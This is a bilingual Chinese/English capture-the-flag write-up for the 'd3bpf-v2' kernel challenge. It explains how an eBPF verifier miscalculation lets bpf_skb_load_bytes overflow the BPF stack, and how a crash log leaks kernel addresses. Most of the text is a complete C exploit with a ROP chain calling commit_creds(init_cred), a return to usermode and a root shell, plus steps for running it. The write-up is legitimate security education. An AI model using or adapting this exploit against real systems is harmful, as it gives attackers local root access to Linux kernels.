### d3bpf-v2

这道题主要受到 [这篇邮件](https://www.openwall.com/lists/oss-
security/2022/01/18/2)的启发，非常感谢 **@tr3e** 师傅！

This challenge was mainly inspired by [this
email](https://www.openwall.com/lists/oss-security/2022/01/18/2), thanks a lot
to **@tr3e**!

在新版本的 kernel 中，不论是 verifier 还是 ALU sanitizer 都加强了检测，上一题中提到的利用完全失效，但是通过
`bpf_skb_load_bytes` 函数仍然可以实现利用。

In the new version of kernel, both verifier and ALU sanitizer have been
enhanced to detect that the exploit mentioned in the previous question is
completely disabled, but with the help of `bpf_skb_load_bytes` function we can
still exploit the bug.

`bpf_skb_load_bytes` 可以将一个 socket 中的数据读到 bpf 的栈上，man page 中是这样写的

`bpf_skb_load_bytes` can read data from a socket onto the bpf stack, as
written in the man page

>       long bpf_skb_load_bytes(const void *skb, u32 offset, void *to,  
>       u32 len)  
>  
>              Description  
>                     This helper was provided as an easy way to load  
>                     data from a packet. It can be used to load len  
>                     bytes from offset from the packet associated to  
>                     skb, into the buffer pointed by to.  
>  
>                     Since Linux 4.7, usage of this helper has mostly  
>                     been replaced by "direct packet access", enabling  
>                     packet data to be manipulated with skb->data and  
>                     skb->data_end pointing respectively to the first  
>                     byte of packet data and to the byte after the last  
>                     byte of packet data. However, it remains useful if  
>                     one wishes to read large quantities of data at once  
>                     from a packet into the eBPF stack.  
>  
>              Return 0 on success, or a negative error in case of  
>                     failure.

如果我们可以让 len 大于栈上 buf 的长度，就可以直接栈溢出。由于添加的漏洞可以让我们获得一个运行时值为 1，而 verifier 认定为 0
的寄存器，所以可以很容易的指定一个很长的 len，并且骗过 verifier。

If we can make len larger than the length of the buf on the stack, we can just
stack overflow. Since the added vulnerability allows us to get a register with
a runtime value of 1 that the verifier determines to be 0, it is easy to
specify a very long len and fool the verifier.

唯一的问题是 leak，也许可以通过溢出修改 bpf 栈上的指针变量实现任意地址读，但是笔者在调试时发现新版本内核在 ebpf 程序 crash（如 0
地址访问）时并不会造成内核崩溃（因为这属于 “soft panic”，当 /proc/sys/kernel/panic_on_oops 值为 0 时
soft panic 并不会直接 panic。似乎在默认情况下其值就是 0，如 Ubuntu 20.04。在 ctf 的 kernel pwn
题中，可能由于不希望被通过 crash 打印日志的方法 leak，一般都会在 qemu 启动项里通过 oops = panic 来让 soft panic
也直接造成 kernel 的重启），还会打出一些地址信息，笔者就直接通过这种方式完成 leak 了。

The only problem is leak, perhaps through the overflow to modify the bpf stack
pointer variables to achieve arbitrary address read, but I found in debugging
the new version of the kernel in the ebpf program crash (such as 0 address
access) does not cause the kernel to crash (Because this is a "soft panic",
soft panic does not panic directly when /proc/sys/kernel/panic_on_oops is 0.
It seems that by default it is 0, as in Ubuntu 20.04. In ctf's kernel pwn
challenges, the soft panic is usually made to cause a direct kernel reboot by
oops = panic in the qemu boot entry, probably because you don't want to be
leaked by crashing and printing the log), but also hit some address
information, the author will be directly through this way to complete the
leak.

由于可以栈溢出，所以之后的利用非常简单，这里不再赘述。

Since it is possible to overflow the stack, the subsequent exploitation is
very simple and will not be repeated here.

#### exp  
```clike=  
// x86_64-buildroot-linux-uclibc-cc core.c bpf_def.c bpf_def.h kernel_def.h
-Os -static -masm=intel -s -o exp  
#include <stdio.h>  
#include <stdint.h>  
#include <stdlib.h>  
#include <string.h>  
#include <unistd.h>  
#include <linux/bpf.h>  
#include <linux/bpf_common.h>  
#include <sys/types.h>  
#include <signal.h>  
#include "kernel_def.h"  
#include "bpf_def.h"

void error_exit(const char *msg)  
{  
   puts(msg);  
   exit(1);  
}

#define CONST_REG   BPF_REG_9  
#define EXP_REG     BPF_REG_8

#define trigger_bug() \  
   /* trigger the bug */       \  
   BPF_MOV64_IMM(CONST_REG, 64),     \  
   BPF_MOV64_IMM(EXP_REG, 0x1),      \  
   /* make exp_reg believed to be 0, in fact 1 */     \  
   BPF_ALU64_REG(BPF_RSH, EXP_REG, CONST_REG),      \  
   BPF_MOV64_REG(BPF_REG_0, EXP_REG)

void get_root()  
{  
   if (getuid() != 0)  
   {  
       error_exit("[-] didn't got root\n");  
   }  
   else  
   {  
       printf("[+] got root\n");  
       system("/bin/sh");  
   }  
}

size_t user_cs, user_gs, user_ds, user_es, user_ss, user_rflags, user_rsp;  
void get_userstat()  
{  
   __asm__(".intel_syntax noprefix\n");  
   __asm__ volatile(  
       "mov user_cs, cs;\  
        mov user_ss, ss;\  
        mov user_gs, gs;\  
        mov user_ds, ds;\  
        mov user_es, es;\  
        mov user_rsp, rsp;\  
        pushf;\  
        pop user_rflags");  
//    printf("[+] got user stat\n");  
}

int main(int argc, char* argv[])  
{  
   if (argc == 1)  
   {  
       // use the crash to leak  
       struct bpf_insn oob_test[] = {  
           trigger_bug(),  
           BPF_ALU64_IMM(BPF_MUL, EXP_REG, (16 - 8)),  
           BPF_MOV64_IMM(BPF_REG_2, 0),  
           BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),  
           BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -8),  
           BPF_MOV64_IMM(BPF_REG_4, 8),  
           BPF_ALU64_REG(BPF_ADD, BPF_REG_4, EXP_REG),  
           BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes),   
           BPF_EXIT_INSN()  
       };

       char write_buf[0x100];  
       memset(write_buf, 0xAA, sizeof(write_buf));  
       if (0 != run_bpf_prog(oob_test, sizeof(oob_test) / sizeof(struct bpf_insn), NULL, write_buf, 0x100))  
       {  
           error_exit("[-] Failed to run bpf program\n");  
       }  
   }  
   else if (argc == 2)  
   {  
       get_userstat();  
       signal(SIGSEGV, &get_root);  
       size_t kernel_offset = strtoul(argv[1], NULL, 16);  
       printf("[+] kernel offset: 0x%lx\n", kernel_offset);  
       size_t commit_creds = kernel_offset + 0xffffffff810d7210;  
       size_t init_cred = kernel_offset + 0xffffffff82e6e860;  
       size_t pop_rdi_ret = kernel_offset + 0xffffffff81097050;  
       size_t swapgs_restore_regs_and_return_to_usermode = kernel_offset + 0xffffffff81e0100b;  
       size_t rop_buf[0x100];  
       int i = 0;  
       rop_buf[i++] = 0xDEADBEEF13377331;  
       rop_buf[i++] = 0xDEADBEEF13377331;  
       rop_buf[i++] = pop_rdi_ret;  
       rop_buf[i++] = init_cred;  
       rop_buf[i++] = commit_creds;  
       rop_buf[i++] = swapgs_restore_regs_and_return_to_usermode;  
       rop_buf[i++] = 0;  
       rop_buf[i++] = 0;  
       rop_buf[i++] = &get_root;  
       rop_buf[i++] = user_cs;  
       rop_buf[i++] = user_rflags;  
       rop_buf[i++] = user_rsp;  
       rop_buf[i++] = user_ss;  
       struct bpf_insn oob_test[] = {  
           trigger_bug(),  
           BPF_ALU64_IMM(BPF_MUL, EXP_REG, (0x100 - 8)),  
           BPF_MOV64_IMM(BPF_REG_2, 0),  
           BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),  
           BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -8),  
           BPF_MOV64_IMM(BPF_REG_4, 8),  
           BPF_ALU64_REG(BPF_ADD, BPF_REG_4, EXP_REG),  
           BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes),   
           BPF_EXIT_INSN()  
       };

       if (0 != run_bpf_prog(oob_test, sizeof(oob_test) / sizeof(struct bpf_insn), NULL, rop_buf, 0x100))  
       {  
           error_exit("[-] Failed to run bpf program\n");  
       }  
   }

   return 0;  
}  
```

首先运行 exp，然后通过打印出的信息获取内核地址，计算出偏移。然后重新运行 exp 并提供偏移即可实现提权。

First run exp, then get the kernel address from the printed information and
calculate the offset. Then re-run exp and provide the offset to achieve the
privilege escalation.

一些头文件没有放在这里，完整的 exp 在[我的 GitHub 仓库](https://github.com/chujDK/my-ctf-
challenges/tree/main/d3bpf-v2)中。

Some of the header files are not here, the full exp is in [my GitHub
repository](https://github.com/chujDK/my-ctf-challenges/tree/main/d3bpf-v2).

Original writeup (https://cjovi.icu/WP/1604.html).